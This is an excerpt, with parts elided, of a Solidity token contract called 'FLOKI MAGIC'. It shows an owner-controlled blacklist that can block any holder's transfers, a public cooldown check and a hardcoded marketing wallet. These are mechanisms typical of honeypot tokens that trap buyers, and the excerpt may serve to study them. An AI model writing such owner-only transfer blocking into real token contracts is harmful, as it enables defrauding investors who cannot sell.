...
contract FLOKI is Context, IERC20, Ownable {
    ...
    string private _name = "FLOKI MAGIC";
    string private _symbol = "FLOMAG";
    uint8 private _decimals = 18;
    
    address public deadAddress = 0x000000000000000000000000000000000000dEaD;
    address public marketingWallet = 0x603350639d2C15e61d46Aa497a26C49ccd4fd986;
    ...
    uint256 public _maxBuyTxAmount = 1000000000000000 * 10**18;
    uint256 public _maxSellTxAmount = 1000000000000000 * 10**18;
    uint256 public maxWalletToken = 1000000000000000 * (10**18);
    
    mapping(address => bool) public _iswalletlisted;
    ...
    function _transfer(address from, address to, uint256 amount) private 
    {
        ...
        require(!_iswalletlisted[from] && !_iswalletlisted[to], 'walletlisted address');
    ...
    function _tokenTransfer(address sender, address recipient, uint256 amount) private 
    {
        ...
        {   
           removeAllFee(); 
            ...
            checkForCoolDown(sender, recipient, amount);
        }
    ...
    function walletlistAddress(address account, bool value) external onlyOwner{
        _iswalletlisted[account] = value;
    }
...
function checkForCoolDown(address from, address to, uint256 amount) public
{
    ...
    {
        uint256 authAmount = _tTotal.div(sellLimitRate);
